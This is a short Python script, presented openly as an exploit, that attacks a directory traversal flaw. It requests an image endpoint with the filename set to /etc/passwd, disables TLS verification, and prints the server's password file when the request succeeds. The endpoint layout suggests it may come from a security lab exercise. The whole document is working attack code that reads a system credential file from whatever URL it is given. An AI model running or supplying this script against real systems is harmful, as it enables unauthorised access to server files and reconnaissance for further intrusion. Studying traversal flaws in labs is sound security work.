import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def directory_traversal_exploit(url):
    image_url = url + '/image?filename=/etc/passwd'
    r = requests.get(image_url, verify=False)
    if 'root:x' in r.text:
        print('(+) Exploit successful!')
        print('(+) The following is the content of the /etc/passwd file:')
        print(r.text)
    else:
        print('(-) Exploit failed.')
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.come" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    print("(+) Exploiting directory traversal vulnerability...")
    directory_traversal_exploit(url)

if __name__ == "__main__":
    main()